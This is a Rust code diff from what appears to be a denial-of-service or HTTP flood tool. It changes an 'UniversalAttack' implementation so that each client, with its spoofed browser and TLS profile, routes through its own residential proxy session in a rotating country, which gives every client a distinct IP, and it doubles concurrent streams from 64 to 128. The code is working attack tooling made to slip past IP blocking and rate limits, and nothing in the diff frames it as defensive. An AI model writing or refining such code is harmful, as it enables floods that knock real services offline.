@@ -194,10 +194,11 @@ static COUNTRIES: &[&str] = &[
     "IL","TH","MY","ID","PH","VN","NZ","PK","BD","NG",
 ];
 
-fn proxy_url(country: &str) -> String {
+fn proxy_url(country: &str, session_id: u64) -> String {
+    // Unique session per client = unique residential IP per client
     format!(
-        "http://{}:{}_country-{}@{}:{}",
-        PROXY_USER, PROXY_PASS, country, PROXY_HOST, PROXY_PORT
+        "http://{}:{}_country-{}_session-{}@{}:{}",
+        PROXY_USER, PROXY_PASS, country, session_id, PROXY_HOST, PROXY_PORT
     )
 }
 
@@ -283,8 +284,8 @@ fn build_tls_variants() -> Vec<Arc<ClientConfig>> {
     configs
 }
 
-fn make_client(tls: Arc<ClientConfig>, p: &BrowserProfile, conns: usize, country: &str) -> Option<Client> {
-    let proxy_str = proxy_url(country);
+fn make_client(tls: Arc<ClientConfig>, p: &BrowserProfile, conns: usize, country: &str, session_id: u64) -> Option<Client> {
+    let proxy_str = proxy_url(country, session_id);
     let proxy = match reqwest::Proxy::all(&proxy_str) {
         Ok(pr) => pr,
         Err(e) => { tracing::warn!("Proxy build failed ({}): {}", proxy_str, e); return None; }
@@ -336,7 +337,7 @@ impl Attack for UniversalAttack {
         let metrics  = ctx.metrics.clone();
         let mode     = self.mode.clone();
         let n_cores  = num_cpus::get();
-        let streams  = 64usize;
+        let streams  = 128usize; // higher concurrency to compensate proxy latency
 
         let tls_variants = Arc::new(build_tls_variants());
         let n_profiles   = PROFILES.len();
@@ -367,14 +368,18 @@ impl Attack for UniversalAttack {
                     .expect("rt");
 
                 rt.block_on(async move {
-                    // Build one client per profile — each gets different country proxy
+                    // Build one client per profile — unique country + session per client
+                    // session_id = unique number → unique residential IP per client
+                    let base_session: u64 = (core_id as u64) * 10000 + std::time::SystemTime::now()
+                        .duration_since(std::time::UNIX_EPOCH).unwrap_or_default().as_secs();
+
                     let clients: Vec<(Arc<Client>, usize)> = PROFILES.iter().enumerate()
                         .filter_map(|(pi, prof)| {
-                            let tls_idx = prof.tls_idx % tls_variants.len();
-                            let tls     = tls_variants[tls_idx].clone();
-                            // Rotate country: each profile gets a different country
-                            let country = COUNTRIES[(core_id * PROFILES.len() + pi) % COUNTRIES.len()];
-                            make_client(tls, prof, conns, country).map(|c| (Arc::new(c), pi))
+                            let tls_idx    = prof.tls_idx % tls_variants.len();
+                            let tls        = tls_variants[tls_idx].clone();
+                            let country    = COUNTRIES[(core_id * PROFILES.len() + pi) % COUNTRIES.len()];
+                            let session_id = base_session + pi as u64;
+                            make_client(tls, prof, conns, country, session_id).map(|c| (Arc::new(c), pi))
                         })
                         .collect();
 
